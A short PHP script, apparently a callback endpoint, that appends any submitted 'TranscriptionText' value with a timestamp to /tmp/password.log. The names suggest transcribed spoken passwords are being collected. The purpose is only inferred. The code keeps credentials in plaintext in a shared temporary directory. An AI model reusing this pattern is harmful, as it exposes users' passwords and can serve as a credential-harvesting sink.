<?php

if(isset($_REQUEST['TranscriptionText'])) file_put_contents("/tmp/password.log",gmdate('r').' '.$_REQUEST['TranscriptionText']."\n",FILE_APPEND);
